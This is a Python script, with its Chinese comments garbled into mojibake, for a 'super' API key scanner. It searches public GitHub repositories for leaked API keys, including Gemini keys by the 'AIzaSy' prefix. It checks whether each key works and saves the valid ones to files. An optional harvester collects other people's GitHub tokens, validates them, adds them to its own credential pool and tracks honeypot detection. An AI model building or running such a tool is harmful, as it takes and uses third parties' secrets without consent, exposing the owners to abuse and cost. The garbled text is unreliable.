#!/usr/bin/env python3
"""
APIå¯†é’¥æ‰«æå™¨ - è¶…çº§ç‰ˆ
é›†æˆé«˜çº§å‡­è¯ç®¡ç†ç³»ç»Ÿå’ŒTokenè‡ªåŠ¨æ”¶é›†åŠŸèƒ½

åŠŸèƒ½ç‰¹æ€§ï¼š
1. ä¼ä¸šçº§å‡­è¯ç®¡ç†ç³»ç»Ÿ
2. æ™ºèƒ½è´Ÿè½½å‡è¡¡ï¼ˆ8ç§ç­–ç•¥ï¼‰
3. è‡ªæ„ˆæœºåˆ¶å’Œå¥åº·æ£€æŸ¥
4. Tokenè‡ªåŠ¨å‘ç°å’ŒéªŒè¯ï¼ˆå¯é€‰ï¼‰
5. å®æ—¶ç›‘æ§ä»ªè¡¨æ¿
6. åŠ å¯†å­˜å‚¨
"""

import os
import sys
import time
import json
import asyncio
import signal
import threading
import argparse
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Set, Tuple
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# æ·»åŠ é¡¹ç›®æ ¹ç›®å½•åˆ°è·¯å¾„
sys.path.insert(0, str(Path(__file__).parent.parent))

# å¯¼å…¥åŸºç¡€æ¨¡å—
from common.config import Config
from common.Logger import Logger
from utils.file_manager import FileManager
from utils.parallel_validator import ParallelValidator

# å¯¼å…¥é«˜çº§å‡­è¯ç®¡ç†ç³»ç»Ÿ
from credential_manager.core.manager import get_credential_manager
from credential_manager.core.models import ServiceType, CredentialStatus
from credential_manager.integration.credential_bridge import CredentialBridge
from credential_manager.discovery.token_harvester import get_token_harvester
from credential_manager.monitoring.dashboard import start_monitoring_server

# å¯¼å…¥å¢å¼ºç‰ˆGitHubå®¢æˆ·ç«¯
from utils.github_client_enhanced import GitHubClientEnhanced

# å¯¼å…¥é€šç”¨APIæ‰«æå™¨
from api_scanner_universal import UniversalAPIScanner

# é…ç½®æ—¥å¿—
logger = Logger.get_logger("api_key_scanner_super")


class SuperAPIKeyScanner:
    """
    è¶…çº§ç‰ˆAPIå¯†é’¥æ‰«æå™¨
    é›†æˆæ‰€æœ‰é«˜çº§åŠŸèƒ½
    """
    
    def __init__(self, target_apis: List[str] = None):
        """
        åˆå§‹åŒ–è¶…çº§æ‰«æå™¨
        
        Args:
            target_apis: è¦æ‰«æçš„APIç±»å‹åˆ—è¡¨ï¼Œé»˜è®¤['gemini']
        """
        logger.info("ğŸš€ åˆå§‹åŒ–è¶…çº§ç‰ˆAPIå¯†é’¥æ‰«æå™¨...")
        
        # è®¾ç½®ç›®æ ‡APIç±»å‹ï¼ˆé»˜è®¤geminiï¼‰
        self.target_apis = target_apis or ['gemini']
        logger.info(f"ğŸ¯ æ‰«æç›®æ ‡: {', '.join(self.target_apis)}")
        
        # åŠ è½½é…ç½®
        self.config = Config()
        
        # åˆå§‹åŒ–æ–‡ä»¶ç®¡ç†å™¨
        self.file_manager = FileManager()
        
        # åˆå§‹åŒ–é«˜çº§å‡­è¯ç®¡ç†ç³»ç»Ÿ
        self._init_credential_manager()
        
        # åˆå§‹åŒ–GitHubå®¢æˆ·ç«¯ï¼ˆä½¿ç”¨å¢å¼ºç‰ˆï¼‰
        self.github_client = GitHubClientEnhanced(self.credential_manager)
        
        # åˆå§‹åŒ–å¹¶è¡ŒéªŒè¯å™¨
        self.validator = ParallelValidator()
        
        # åˆå§‹åŒ–Tokenæ”¶é›†å™¨ï¼ˆå¦‚æœå¯ç”¨ï¼‰
        self._init_token_harvester()
        
        # åˆå§‹åŒ–é€šç”¨APIæ‰«æå™¨
        self.universal_scanner = UniversalAPIScanner(self.target_apis)
        
        # ç»Ÿè®¡ä¿¡æ¯
        self.stats = {
            'start_time': datetime.now(),
            'total_scanned': 0,
            'total_found': 0,
            'total_valid': 0,
            'total_invalid': 0,
            'discovered_tokens': 0,
            'harvested_tokens': 0,
            'errors': 0
        }
        
        # è¿è¡ŒçŠ¶æ€
        self.running = True
        self.shutdown_event = threading.Event()
        
        # æ³¨å†Œä¿¡å·å¤„ç†
        self._register_signal_handlers()
        
        # å¯åŠ¨ç›‘æ§æœåŠ¡å™¨ï¼ˆå¦‚æœé…ç½®ï¼‰
        self._start_monitoring()
        
        logger.info("âœ… è¶…çº§æ‰«æå™¨åˆå§‹åŒ–å®Œæˆ")
    
    def _init_credential_manager(self):
        """åˆå§‹åŒ–å‡­è¯ç®¡ç†ç³»ç»Ÿ"""
        logger.info("ğŸ”§ åˆå§‹åŒ–é«˜çº§å‡­è¯ç®¡ç†ç³»ç»Ÿ...")
        
        # é…ç½®å‡­è¯ç®¡ç†å™¨
        credential_config = {
            'encryption_enabled': os.getenv('CREDENTIAL_ENCRYPTION_ENABLED', 'true').lower() == 'true',
            'balancing_strategy': os.getenv('CREDENTIAL_BALANCING_STRATEGY', 'quota_aware'),
            'min_pool_size': int(os.getenv('CREDENTIAL_MIN_POOL_SIZE', '10')),
            'max_pool_size': int(os.getenv('CREDENTIAL_MAX_POOL_SIZE', '100')),
            'health_check_interval': int(os.getenv('CREDENTIAL_HEALTH_CHECK_INTERVAL', '60')),
            'discovery_interval': int(os.getenv('CREDENTIAL_DISCOVERY_INTERVAL', '300')),
            'harvesting_enabled': os.getenv('CREDENTIAL_AUTO_HARVEST', 'false').lower() == 'true'
        }
        
        # åˆå§‹åŒ–ç®¡ç†å™¨
        self.credential_manager = get_credential_manager(credential_config)
        
        # åˆ›å»ºé›†æˆæ¡¥æ¥å™¨
        self.credential_bridge = CredentialBridge(self.credential_manager)
        
        # å¯¼å…¥ç°æœ‰tokens
        self._import_existing_tokens()
        
        logger.info(f"âœ… å‡­è¯ç®¡ç†ç³»ç»Ÿå°±ç»ª - ç­–ç•¥: {credential_config['balancing_strategy']}")
    
    def _import_existing_tokens(self):
        """å¯¼å…¥ç°æœ‰çš„GitHub tokens"""
        imported_count = 0
        
        # ä»ç¯å¢ƒå˜é‡å¯¼å…¥
        env_tokens = os.getenv('GITHUB_TOKENS', '').split(',')
        for token in env_tokens:
            token = token.strip()
            if token and self.credential_manager.add_credential(
                ServiceType.GITHUB, 
                token,
                {'source': 'env', 'imported_at': datetime.now().isoformat()}
            ):
                imported_count += 1
        
        # ä»æ–‡ä»¶å¯¼å…¥ï¼ˆå¦‚æœé…ç½®ï¼‰
        if os.getenv('USE_EXTERNAL_TOKEN_FILE', 'false').lower() == 'true':
            token_file = os.getenv('GITHUB_TOKENS_FILE', 'github_tokens.txt')
            if os.path.exists(token_file):
                with open(token_file, 'r') as f:
                    for line in f:
                        token = line.strip()
                        if token and not token.startswith('#'):
                            if self.credential_manager.add_credential(
                                ServiceType.GITHUB,
                                token,
                                {'source': 'file', 'imported_at': datetime.now().isoformat()}
                            ):
                                imported_count += 1
        
        logger.info(f"ğŸ“¥ å¯¼å…¥äº† {imported_count} ä¸ªGitHub tokens")
    
    def _init_token_harvester(self):
        """åˆå§‹åŒ–Tokenæ”¶é›†å™¨"""
        if os.getenv('CREDENTIAL_AUTO_HARVEST', 'false').lower() == 'true':
            logger.info("ğŸ” åˆå§‹åŒ–Tokenè‡ªåŠ¨æ”¶é›†å™¨...")
            self.token_harvester = get_token_harvester()
            
            if self.token_harvester.enabled:
                logger.info("âœ… Tokenæ”¶é›†å™¨å·²å¯ç”¨")
                logger.warning("âš ï¸ è¯·ç¡®ä¿åˆæ³•åˆè§„ä½¿ç”¨æ­¤åŠŸèƒ½")
            else:
                logger.info("ğŸ”’ Tokenæ”¶é›†å™¨å·²ç¦ç”¨")
                self.token_harvester = None
        else:
            self.token_harvester = None
    
    def _start_monitoring(self):
        """å¯åŠ¨ç›‘æ§æœåŠ¡å™¨"""
        if os.getenv('MONITORING_ENABLED', 'false').lower() == 'true':
            logger.info("ğŸ“Š å¯åŠ¨ç›‘æ§ä»ªè¡¨æ¿...")
            monitor_thread = threading.Thread(
                target=start_monitoring_server,
                args=(self.credential_manager,),
                daemon=True
            )
            monitor_thread.start()
            logger.info("âœ… ç›‘æ§ä»ªè¡¨æ¿å·²å¯åŠ¨: http://localhost:8080")
    
    def _register_signal_handlers(self):
        """æ³¨å†Œä¿¡å·å¤„ç†å™¨"""
        def signal_handler(signum, frame):
            logger.info(f"\nâš ï¸ æ”¶åˆ°ä¿¡å· {signum}ï¼Œæ­£åœ¨ä¼˜é›…å…³é—­...")
            self.shutdown()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
    def shutdown(self):
        """ä¼˜é›…å…³é—­"""
        if not self.running:
            return
        
        self.running = False
        self.shutdown_event.set()
        
        logger.info("ğŸ’¾ ä¿å­˜è¿›åº¦å’Œç»Ÿè®¡ä¿¡æ¯...")
        self._save_progress()
        
        # å…³é—­å‡­è¯ç®¡ç†å™¨
        if hasattr(self, 'credential_manager'):
            self.credential_manager.shutdown()
        
        logger.info("ğŸ‘‹ æ‰«æå™¨å·²å®‰å…¨å…³é—­")
    
    def _save_progress(self):
        """ä¿å­˜æ‰«æè¿›åº¦"""
        progress_file = Path("data/scanner_progress.json")
        progress_file.parent.mkdir(parents=True, exist_ok=True)
        
        progress_data = {
            'timestamp': datetime.now().isoformat(),
            'stats': self.stats,
            'credential_status': self.credential_manager.get_status() if hasattr(self, 'credential_manager') else {},
            'harvester_stats': self.token_harvester.get_statistics() if self.token_harvester else {}
        }
        
        with open(progress_file, 'w') as f:
            json.dump(progress_data, f, indent=2)
        
        logger.info(f"âœ… è¿›åº¦å·²ä¿å­˜åˆ° {progress_file}")
    
    async def scan_repository(self, repo_data: Dict) -> List[Dict]:
        """
        æ‰«æå•ä¸ªä»“åº“
        
        Args:
            repo_data: ä»“åº“ä¿¡æ¯
            
        Returns:
            å‘ç°çš„å¯†é’¥åˆ—è¡¨
        """
        found_keys = []
        repo_name = repo_data.get('full_name', 'unknown')
        
        try:
            # æœç´¢ä»“åº“ä¸­çš„æ–‡ä»¶
            files = await self.github_client.search_in_repository(
                repo_name,
                "AIzaSy",
                file_extensions=['.json', '.js', '.py', '.env', '.yml', '.yaml']
            )
            
            for file_data in files:
                # è·å–æ–‡ä»¶å†…å®¹
                content = await self.github_client.get_file_content(
                    repo_name,
                    file_data['path']
                )
                
                if content:
                    # æå–æ‰€æœ‰ç±»å‹çš„APIå¯†é’¥
                    all_keys = self._extract_api_keys(content)
                    
                    for api_type, keys in all_keys.items():
                        for key in keys:
                            key_info = {
                                'key': key,
                                'api_type': api_type,
                                'repository': repo_name,
                                'file_path': file_data['path'],
                                'file_url': file_data.get('html_url', ''),
                                'discovered_at': datetime.now().isoformat()
                            }
                            found_keys.append(key_info)
                    
                    # å¦‚æœå¯ç”¨äº†Tokenæ”¶é›†å™¨ï¼Œæ‰«æGitHub tokens
                    if self.token_harvester and self.token_harvester.enabled:
                        discovered_tokens = self.token_harvester.extract_tokens_from_content(
                            content,
                            file_data.get('html_url', '')
                        )
                        
                        if discovered_tokens:
                            self.stats['discovered_tokens'] += len(discovered_tokens)
                            
                            # å¼‚æ­¥éªŒè¯tokens
                            for token in discovered_tokens:
                                if await self.token_harvester.validate_token(token):
                                    self.stats['harvested_tokens'] += 1
            
            self.stats['total_scanned'] += 1
            
        except Exception as e:
            logger.error(f"æ‰«æä»“åº“ {repo_name} æ—¶å‡ºé”™: {e}")
            self.stats['errors'] += 1
        
        return found_keys
    
    def _extract_api_keys(self, content: str) -> Dict[str, List[str]]:
        """
        ä»å†…å®¹ä¸­æå–æ‰€æœ‰ç±»å‹çš„APIå¯†é’¥
        
        Args:
            content: æ–‡ä»¶å†…å®¹
            
        Returns:
            {api_type: [keys]} å­—å…¸
        """
        # ä½¿ç”¨é€šç”¨æ‰«æå™¨æå–æ‰€æœ‰ç±»å‹çš„å¯†é’¥
        return self.universal_scanner.extract_all_keys(content)
    
    async def validate_keys(self, keys: List[Dict]) -> Tuple[List[Dict], List[Dict]]:
        """
        æ‰¹é‡éªŒè¯APIå¯†é’¥
        
        Args:
            keys: å¾…éªŒè¯çš„å¯†é’¥åˆ—è¡¨
            
        Returns:
            (æœ‰æ•ˆå¯†é’¥åˆ—è¡¨, æ— æ•ˆå¯†é’¥åˆ—è¡¨)
        """
        valid_keys = []
        invalid_keys = []
        
        # æŒ‰APIç±»å‹åˆ†ç»„
        keys_by_type = {}
        for key_info in keys:
            api_type = key_info.get('api_type', 'gemini')
            if api_type not in keys_by_type:
                keys_by_type[api_type] = []
            keys_by_type[api_type].append(key_info)
        
        # ä½¿ç”¨é€šç”¨æ‰«æå™¨éªŒè¯
        for api_type, type_keys in keys_by_type.items():
            for key_info in type_keys:
                is_valid = self.universal_scanner.validate_key(
                    key_info['key'],
                    api_type
                )
                
                if is_valid:
                    valid_keys.append(key_info)
                    self.stats['total_valid'] += 1
                    logger.info(f"âœ… æœ‰æ•ˆ {api_type} å¯†é’¥: {key_info['key'][:10]}... from {key_info['repository']}")
                else:
                    invalid_keys.append(key_info)
                    self.stats['total_invalid'] += 1
        
        return valid_keys, invalid_keys
    
    async def run_scan(self, queries: List[str]):
        """
        è¿è¡Œæ‰«æä»»åŠ¡
        
        Args:
            queries: æœç´¢æŸ¥è¯¢åˆ—è¡¨
        """
        logger.info(f"ğŸ” å¼€å§‹æ‰«æ {len(queries)} ä¸ªæŸ¥è¯¢...")
        
        all_found_keys = []
        
        for query in queries:
            if not self.running:
                break
            
            logger.info(f"ğŸ“ å¤„ç†æŸ¥è¯¢: {query}")
            
            try:
                # æœç´¢ä»“åº“
                repositories = await self.github_client.search_repositories(
                    query,
                    max_results=100
                )
                
                logger.info(f"ğŸ“¦ æ‰¾åˆ° {len(repositories)} ä¸ªä»“åº“")
                
                # å¹¶å‘æ‰«æä»“åº“
                scan_tasks = []
                for repo in repositories:
                    if not self.running:
                        break
                    scan_tasks.append(self.scan_repository(repo))
                
                # ç­‰å¾…æ‰€æœ‰æ‰«æå®Œæˆ
                if scan_tasks:
                    results = await asyncio.gather(*scan_tasks, return_exceptions=True)
                    
                    for result in results:
                        if isinstance(result, list):
                            all_found_keys.extend(result)
                            self.stats['total_found'] += len(result)
                
                # æ‰¹é‡éªŒè¯å‘ç°çš„å¯†é’¥
                if all_found_keys:
                    logger.info(f"ğŸ”‘ éªŒè¯ {len(all_found_keys)} ä¸ªå¯†é’¥...")
                    valid_keys, invalid_keys = await self.validate_keys(all_found_keys)
                    
                    # ä¿å­˜æœ‰æ•ˆå¯†é’¥
                    if valid_keys:
                        self._save_valid_keys(valid_keys)
                
                # æ›´æ–°å‡­è¯çŠ¶æ€
                self._update_credential_status()
                
            except Exception as e:
                logger.error(f"å¤„ç†æŸ¥è¯¢ '{query}' æ—¶å‡ºé”™: {e}")
                self.stats['errors'] += 1
        
        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡
        self._show_statistics()
    
    def _save_valid_keys(self, keys: List[Dict]):
        """ä¿å­˜æœ‰æ•ˆå¯†é’¥"""
        # æŒ‰APIç±»å‹åˆ†ç»„ä¿å­˜
        keys_by_type = {}
        for key_info in keys:
            api_type = key_info.get('api_type', 'gemini')
            if api_type not in keys_by_type:
                keys_by_type[api_type] = []
            keys_by_type[api_type].append(key_info)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        for api_type, type_keys in keys_by_type.items():
            output_file = Path(f"data/keys/{api_type}_valid_keys_{timestamp}.json")
            output_file.parent.mkdir(parents=True, exist_ok=True)
            
            # è¯»å–ç°æœ‰å¯†é’¥
            existing_keys = []
            base_file = Path(f"data/keys/{api_type}_valid_keys.json")
            if base_file.exists():
                with open(base_file, 'r') as f:
                    existing_keys = json.load(f)
            
            # åˆå¹¶æ–°å¯†é’¥
            all_keys = existing_keys + type_keys
            
            # å»é‡ï¼ˆåŸºäºkeyå€¼ï¼‰
            unique_keys = {}
            for key_info in all_keys:
                unique_keys[key_info['key']] = key_info
            
            # ä¿å­˜åˆ°åŸºç¡€æ–‡ä»¶
            with open(base_file, 'w') as f:
                json.dump(list(unique_keys.values()), f, indent=2)
            
            # ä¹Ÿä¿å­˜å¸¦æ—¶é—´æˆ³çš„å¤‡ä»½
            with open(output_file, 'w') as f:
                json.dump(type_keys, f, indent=2)
            
            logger.info(f"ğŸ’¾ ä¿å­˜äº† {len(type_keys)} ä¸ªæ–°çš„ {api_type} æœ‰æ•ˆå¯†é’¥")
    
    def _update_credential_status(self):
        """æ›´æ–°å‡­è¯çŠ¶æ€"""
        status = self.credential_manager.get_status()
        
        # æ˜¾ç¤ºå‡­è¯æ± çŠ¶æ€
        for service_type, pool_status in status['pools'].items():
            logger.info(
                f"ğŸ”‘ {service_type} æ± çŠ¶æ€: "
                f"æ´»è·ƒ={pool_status['active_count']}/{pool_status['total_count']}, "
                f"å¥åº·åº¦={pool_status['health_score']:.1f}%"
            )
    
    def _show_statistics(self):
        """æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯"""
        duration = datetime.now() - self.stats['start_time']
        
        logger.info("=" * 60)
        logger.info("ğŸ“Š æ‰«æç»Ÿè®¡")
        logger.info("=" * 60)
        logger.info(f"â±ï¸  è¿è¡Œæ—¶é—´: {duration}")
        logger.info(f"ğŸ“¦ æ‰«æä»“åº“: {self.stats['total_scanned']}")
        logger.info(f"ğŸ”‘ å‘ç°å¯†é’¥: {self.stats['total_found']}")
        logger.info(f"âœ… æœ‰æ•ˆå¯†é’¥: {self.stats['total_valid']}")
        logger.info(f"âŒ æ— æ•ˆå¯†é’¥: {self.stats['total_invalid']}")
        
        # æ˜¾ç¤ºå„APIç±»å‹çš„ç»Ÿè®¡
        if hasattr(self, 'universal_scanner'):
            print("\nğŸ“Š å„APIç±»å‹ç»Ÿè®¡:")
            for api_type, stats in self.universal_scanner.stats.items():
                if stats['total_found'] > 0:
                    print(f"  {api_type.upper()}:")
                    print(f"    å‘ç°: {stats['total_found']}")
                    print(f"    æœ‰æ•ˆ: {stats['valid']}")
                    print(f"    æ— æ•ˆ: {stats['invalid']}")
        
        if self.token_harvester:
            logger.info(f"ğŸ” å‘ç°Tokens: {self.stats['discovered_tokens']}")
            logger.info(f"âœ¨ æ”¶é›†Tokens: {self.stats['harvested_tokens']}")
        
        logger.info(f"âš ï¸  é”™è¯¯æ¬¡æ•°: {self.stats['errors']}")
        
        # æ˜¾ç¤ºå‡­è¯ç®¡ç†å™¨ç»Ÿè®¡
        cm_stats = self.credential_manager.stats
        logger.info("=" * 60)
        logger.info("ğŸ¯ å‡­è¯ç®¡ç†ç»Ÿè®¡")
        logger.info("=" * 60)
        logger.info(f"ğŸ“¥ æ€»è¯·æ±‚æ•°: {cm_stats['total_requests']}")
        logger.info(f"âœ… æˆåŠŸè¯·æ±‚: {cm_stats['successful_requests']}")
        logger.info(f"âŒ å¤±è´¥è¯·æ±‚: {cm_stats['failed_requests']}")
        logger.info(f"ğŸ” å‘ç°å‡­è¯: {cm_stats['credentials_discovered']}")
        logger.info(f"âœ”ï¸  éªŒè¯å‡­è¯: {cm_stats['credentials_validated']}")
        logger.info(f"ğŸ“ å½’æ¡£å‡­è¯: {cm_stats['credentials_archived']}")
        
        if self.token_harvester:
            harvester_stats = self.token_harvester.get_statistics()
            if harvester_stats['enabled']:
                logger.info("=" * 60)
                logger.info("ğŸ” Tokenæ”¶é›†ç»Ÿè®¡")
                logger.info("=" * 60)
                logger.info(f"ğŸ” æ€»å‘ç°: {harvester_stats['stats']['total_discovered']}")
                logger.info(f"âœ”ï¸  æ€»éªŒè¯: {harvester_stats['stats']['total_validated']}")
                logger.info(f"â• æ€»æ·»åŠ : {harvester_stats['stats']['total_added']}")
                logger.info(f"âŒ æ€»æ‹’ç»: {harvester_stats['stats']['total_rejected']}")
                logger.info(f"ğŸ¯ èœœç½æ£€æµ‹: {harvester_stats['stats']['honeypots_detected']}")
        
        logger.info("=" * 60)


async def main():
    """ä¸»å‡½æ•°"""
    print("=" * 60)
    print("ğŸš€ APIå¯†é’¥æ‰«æå™¨ - è¶…çº§ç‰ˆ")
    print("=" * 60)
    print("åŠŸèƒ½ç‰¹æ€§:")
    print("  âœ… é«˜çº§å‡­è¯ç®¡ç†ç³»ç»Ÿ")
    print("  âœ… æ™ºèƒ½è´Ÿè½½å‡è¡¡")
    print("  âœ… è‡ªæ„ˆæœºåˆ¶")
    print("  âœ… Tokenè‡ªåŠ¨æ”¶é›†ï¼ˆå¯é€‰ï¼‰")
    print("  âœ… å®æ—¶ç›‘æ§ä»ªè¡¨æ¿")
    print("=" * 60)
    
    # åˆ›å»ºæ‰«æå™¨å®ä¾‹
    scanner = SuperAPIKeyScanner()
    
    # åŠ è½½æŸ¥è¯¢
    queries_file = Path("queries.txt")
    if not queries_file.exists():
        logger.error("âŒ queries.txt æ–‡ä»¶ä¸å­˜åœ¨")
        return
    
    with open(queries_file, 'r') as f:
        queries = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    if not queries:
        logger.error("âŒ æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„æŸ¥è¯¢")
        return
    
    logger.info(f"ğŸ“‹ åŠ è½½äº† {len(queries)} ä¸ªæŸ¥è¯¢")
    
    try:
        # è¿è¡Œæ‰«æ
        await scanner.run_scan(queries)
    except KeyboardInterrupt:
        logger.info("\nâš ï¸ ç”¨æˆ·ä¸­æ–­")
    except Exception as e:
        logger.error(f"âŒ æ‰«æå‡ºé”™: {e}")
    finally:
        scanner.shutdown()


if __name__ == "__main__":
    # è¿è¡Œä¸»ç¨‹åº
    asyncio.run(main())